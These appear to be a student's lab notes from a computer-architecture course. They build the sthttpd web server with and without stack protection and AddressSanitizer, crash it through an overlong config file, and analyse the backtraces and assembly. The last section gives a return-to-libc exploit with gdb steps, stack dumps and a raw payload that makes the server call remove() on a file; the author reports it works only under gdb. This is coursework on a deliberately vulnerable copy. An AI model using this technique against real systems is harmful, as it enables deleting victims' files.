@@ -1,0 +1,367 @@
+* compile the 3 versions of thttpd
+
+  - download thttpd
+    ----
+    wget http://cs.ucla.edu/classes/spring15/cs33/lab/sthttpd-2.27.0.tar.gz
+    tar -xvf sthttpd-2.27.0.tar.gz
+    ----
+
+  - apply the patch(manually)
+    ----
+    cd sthttpd-2.27.0
+    cd src
+    emacs thttpd.c
+    ----
+
+  - configure /make
+    ----
+    ./configure    CFLAGS='-m32'    LDFLAGS="-Xlinker \
+      --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+    make CFLAGS='-m32 -g3 -O2 -fno-inline -fstack-protector-strong'
+    mv src/thttpd src/thttpd-sp
+    ----
+    make clean
+    make CFLAGS='-m32 -g3 -O2 -fno-inline -fsanitize=address'
+    mv src/thttpd src/thttpd-as
+    ----
+    make clean
+    make CFLAGS='-m32 -g3 -O2 -fno-inline'
+    mv src/thttpd src/thttpd-no
+    ----
+
+
+* run it normally
+
+  - my port number
+
+    12330 + 3* (504425747 % 293) + 1/2/3 = 12841/ 12842/ 12843
+
+  - test the server
+    ----
+    echo "This is a file used for testing the server" > "foo.txt"
+    src/thttpd-sp -p 12841 -D
+    ----
+    (open another terminal and login seasnet again. run)
+    ----
+    curl http://localhost:12841/foo.txt
+    ----
+
+    we then get the content of the file.
+    And do the same thing for the other 2 options:
+    ----
+    src/thttpd-as -p 12842 -D
+    ----
+    curl http://localhost:12842/foo.txt
+    ----
+    src/thttpd-no -p 12843 -D
+    ----
+    curl http://localhost:12843/foo.txt
+    ----
+
+
+* crash the server
+
+  - the crash
+
+    We notice the bug patched is in option -C, reading an option file.
+    We create a file called "long.txt""
+    (it looks like this)
+    ----
+    debug debug debug debug debug debug debug debug debug debug debug debug \
+    debug debug debug debug debug debug debug debug debug debug debug debug \
+    debug debug debug debug debug debug debug debug debug debug debug debug \
+    debug debug debug debug debug debug debug debug debug debug debug debug \
+    debug debug debug debug debug debug debug debug debug debug debug debug
+    ----
+
+    Then we run
+    ----
+    src/thttpd-sp -p 12841 -C long.txt
+    src/thttpd-as -p 12842 -C long.txt
+    src/thttpd-no -p 12843 -C long.txt
+    ----
+    and we get
+    ----
+    *** stack smashing detected ***: src/thttpd-sp terminated
+    Segmentation fault
+    ----
+    Segmentation fault
+    ----
+    ==29421==ERROR: AddressSanitizer: stack-buffer-overflow on \
+    address 0xffdcc304 at pc 0x5dced1 bp 0xffdcc258 sp 0xffdcc23c
+    ...
+    ----
+
+  - note
+
+    One thing to notice is that:
+    when using too long a file for "long.txt", we still crash -as,
+    but for the -no and -sp, we get error message:
+    ----
+    src/thttpd-no: unknown config option 'deb'
+    ----
+
+  - the backtrace & what instruction causes the crash?
+    ----sp----
+    #0  uw_frame_state_for (context=context@entry=0xffffb988, \
+      fs=fs@entry=0xffffba08) at ../../../../gcc-4.9.2/libgcc/unwind-dw2.c:1253
+    #1  0x00158b20 in _Unwind_Backtrace (trace=0x3a5670 <backtrace_helper>, \
+      trace_argument=0xffffbae4) at ../../../../gcc-4.9.2/libgcc/unwind.inc:290
+    #2  0x003a5865 in backtrace () from /lib/libc.so.6
+    #3  0x0031674b in __libc_message () from /lib/libc.so.6
+    #4  0x003a8dad in __fortify_fail () from /lib/libc.so.6
+    #5  0x003a8d5a in __stack_chk_fail () from /lib/libc.so.6
+    #6  0x0804b69f in read_config (filename=<optimized out>) at thttpd.c:1194
+    ----
+    0x0804b603 <+1283>:mov    0x7c(%esp),%eax
+    0x0804b607 <+1287>:xor    %gs:0x14,%eax
+    0x0804b60e <+1294>:jne    0x804b69a <read_config+1434>
+    ^ this conditional jump evaluates to true, and jump to
+    0x0804b69a <+1434>:call   0x8049b68 <__stack_chk_fail@plt>
+    and ends the program
+
+    ----as----
+    #0 0x2d6ed0 in __interceptor_strchr ../../../../../\
+      gcc-4.9.2/libsanitizer/asan/asan_interceptors.cc:417
+    #1 0x804da6f in read_config /u/eng/class/classnli/sthttpd-2.27.0/\
+      src/thttpd.c:1022
+    #2 0x20677561 (+0x678561)
+    ----
+    0x002d6ec0 <+224>:test   %eax,%eax
+    0x002d6ec7 <+231>:je     0x2d6f40 \
+      <__interceptor_strchr(char const*, int)+352>
+    ^ this conditional jump evaluates to false, and move along to
+    0x002d6ecc <+236>:call   0x30a8a0 <__sanitizer::StackTrace::GetCurrentPc()>
+    and ends the program
+
+    ----no----
+    #0  0x31313131 in ?? ()
+    #1  0xffffc21f in ?? ()
+    Backtrace stopped: previous frame inner to this frame (corrupt stack?)
+    ----
+    Since there is no protection, we know it's the ret instruction that
+    causes the crash. Steping through function read_config in GDB confirms
+    this guess.
+
+
+* get the assembly language file
+
+  in the src/ directory
+  ----
+  make thttpd.o CFLAGS='-m32 -S -O2 -fno-inline -fstack-protector-strong'
+  mv thttpd.o thttpd-sp.s
+  make thttpd.o CFLAGS='-m32 -S -O2 -fno-inline'
+  mv thttpd.o thttpd-no.s
+  make thttpd.o CFLAGS='-m32 -S -O2 -fno-inline -fsanitize=address'
+  mv thttpd.o thttpd-as.s
+  ----
+
+
+* explain -sp and -as
+
+  - as
+
+    When ever an memory is allocated, the address sanitizer
+    puts "poisoned area" around it, and record the allocated
+    area(unpoisoned) and poisoned area on a "shadow memory".
+
+    The shadow memory represent every 8 bytes in the real memory
+    with a 1-byte number, ff, 00, or k meaning the first k bytes
+    are not poisoned. Therefore, a word
+    in the shadow memory records 32 bytes in the real memory.
+
+    Then, whenever the program access memory, the address
+    sanitizer checks if it's poisoned. If yes, it will
+    terminate the program.
+
+    In the thttpd-as.s file, we have (for example)
+    ----
+    leal	8(%eax), %eax
+    subl	$44, %esp
+    .cfi_def_cfa_offset 64
+    movl	%edx, 12(%esp)
+    movl	%eax, %edx
+    shrl	$3, %edx
+    movzbl	536870912(%edx), %edx
+    testb	%dl, %dl
+    je	.L1634
+    movl	%eax, %ecx
+    andl	$7, %ecx
+    addl	$3, %ecx
+    cmpb	%dl, %cl
+    jge	.L1977
+    ----
+    This is checking the address in %eax, over the shadow
+    memory at 536870912(%edx), where 536870912 is the shadow
+    base. If the shadow memeory is not 0, it further checks
+    if the part being accessed are poisoned or not, by only
+    looking at the last 8 byte bing accessed. If it's poisoned,
+    it will jump to .L1977, which reports the overflow.
+    Notice the $addl $3, %ecx. This is because the program load
+    4 bytes at a time, while the address only represents the 1st
+    byte of the 4.
+
+  - sp
+
+    The strong-protection option add canaries before and check canaries after calling
+    the function that declares local array, struct, union over 8 bytes long, or use
+    addresses of local variable as assigned value or function argument. It push a
+    random number right below the ret address, and check for it before the function
+    returns.
+
+    However, in the function handle_read, non of the characteristic exists, so the
+    strong-protection did nothing for it. We can see this by comparing the machine
+    code with the no-protection one: they are identical.
+
+    One example of using canary can be found in the function hanle_send:
+    ----
+    movl	%gs:20, %eax
+    movl	%eax, 44(%esp)
+    ----(...)
+    movl	44(%esp), %eax
+    xorl	%gs:20, %eax
+    jne	.L517
+    ----
+    And there is no similar code in handle_read.
+
+
+* exploit
+
+  - using the remove function
+
+    Notice that the seasenet server uses NX bit, we can't
+    inject malicious "arbitrary" code from the stack. I
+    used professor's return oriented programming method.
+
+    First, I tried to find in the source code where it uses
+    "remove" function. There is no such place, but notice
+    it uses "fopen" and "fclose" alot. My guess is that
+    the remove function is in the same library as them. I
+    tried
+    ----
+    (gdb) disas remove
+    Dump of assembler code for function remove:
+    0x0030a690 <+0>:push   %ebp
+    0x0030a691 <+1>:mov    %esp,%ebp
+    0x0030a693 <+3>:sub    $0xc,%esp
+    0x0030a696 <+6>:mov    %ebx,-0x8(%ebp)
+    0x0030a699 <+9>:call   0x2c2b6f <__i686.get_pc_thunk.bx>
+    0x0030a69e <+14>:add    $0x134956,%ebx
+    0x0030a6a4 <+20>:mov    %esi,-0x4(%ebp)
+    0x0030a6a7 <+23>:mov    0x8(%ebp),%esi
+    0x0030a6aa <+26>:mov    %esi,(%esp)
+    0x0030a6ad <+29>:call   0x37fd20 <unlink>
+    ----
+    And it's there.
+
+  - Changing the return address
+
+    Under gdb, we can easily get the return address of the "read_config"
+    function. We run
+    ----
+    (gdb) break read_config
+    r -C attack.txt
+    x/4xw $esp
+    ----
+    0xffffc1fc:0x0804b88a    0x00000000    0x00000003    0xffffd444
+    ----
+    And the first word is the return address, at 0xffffc1fc.
+    We then create a configFile similar to the one mentioned before, with
+    ----
+    logfile=1111111111111111111111111111111111111111111111111111111111111...
+    ----
+    By counting the bytes, and some experiment, we manage to add any number
+    we want to memory location 0xffffc1fc.
+
+    To get an ascii representation of the address 0x0030a690, we run the
+    script provided by TA, hex2raw.
+
+  - Writing the file name on the stack
+
+    We have already called remove function, successfully, and the
+    function takes a pointer to an c-string as argument. We need
+    now to generate the file-name string and a pointer to it.
+
+    After several failed tries, I decided to write a sample c program
+    ----
+    #include <stdio.h>
+    int main(){
+    char filename[] = "././././././././././././././././././././././././
+                       ./././././././././././././target.txt";
+    remove(filename);
+    }
+    ----
+    After compiling it, I run it under gdb, and again, print the stack
+    right before the main calls the "remove" function.
+    ----
+    0xffffd430:	0xffffd44b	0xffffd4e4	0x080481b0	0xffffd4d8
+    0xffffd440:	0x002a9a54	0x00000000	0x2effd6b0	0x2e2f2e2f
+    0xffffd450:	0x2e2f2e2f	0x2e2f2e2f	0x2e2f2e2f	0x2e2f2e2f
+    0xffffd460:	0x2e2f2e2f	0x2e2f2e2f	0x2e2f2e2f	0x2e2f2e2f
+    0xffffd470:	0x2e2f2e2f	0x2e2f2e2f	0x2e2f2e2f	0x2e2f2e2f
+    0xffffd480:	0x2e2f2e2f	0x2e2f2e2f	0x2e2f2e2f	0x2e2f2e2f
+    0xffffd490:	0x2e2f2e2f	0x7261742f	0x2e746567	0x00747874
+    0xffffd4a0:	0x0043d1d8	0x08048210	0x0043fce0	0xffffd4d0
+    0xffffd4b0:	0x00000000	0x00000000
+    ----
+    I copy the stack, format it (using some script), and get the ascii string
+    into attack.txt . Note that the stack is stored in Little endian manner,
+    so I need to reverse each byte.
+
+    Finally I adjust the pointer on the top of the stack, by looking into gdb.
+    After experimenting, I found that the pointer should be in the location
+    one word after the return address. The final attack.txt looks like this:
+    (See attack1.txt)
+    ----
+    Logfile=1111111111111111111111111111111111111111111111111111111111111\
+    11111111111111111111111111111111111111111111111111111111111¦0 11\
+    11ÂÿÿÔÓÿÿ°ÈÓÿÿ\
+    Tš*     °Öÿ./././././././././././././././././././././././\
+    ././././././././././././././target.txt ØÑC ‚àü\
+    C ÀÓÿÿ        
+    ----
+
+  - Trying it out
+
+    I try the attack out, and it works! (under gdb)
+    ----
+    $ echo "I'm the target file. HAHAHA" > target.txt
+    $ cat target.txt
+    ----
+    I'm the target file. HAHAHA
+    ----
+    $ gdb src/thttpd-no
+    (gdb) r -C attack.c
+    (gdb) quit
+    $ cat target.txt
+    ----
+    cat: target.txt: No such file or directory
+    ----
+
+  - Trying to get it work without gdb.
+
+    At first, I thought the only step I need to take for this
+    exploit to work without gdb is to create a longer file name,
+    and letting the pointer point somewhere in the middle of it.
+    (Starting with "."). This is not too hard. I modified my
+    smple c program, with an 800 char string, and created my
+    attack string as described above.
+    (See ATTACK.txt)
+
+    I tested it under gdb, this, again works.
+
+    However, when I apply to the thttpd-no executable, it never works.
+    ----
+    src/thttpd-no -C ATTACK.txt
+    ----
+    I thought the problem being the sled not long enough. To verify my
+    guess, I changed the thttpd.c file, and let it read 10000 characters
+    instead of the original 1000. However, it still doesn't work.
+    (I used a 4000 char string, since the remove function take in at
+    most around 4000 characters.)
+
+    My final guess is that seasnet uses Address space layout randomization,
+    so the first jump to remove function using the ret, doesn't work
+    anymore. I believe if I can turn off the ASLR, my approach will work,
+    but doing so will require root.
+
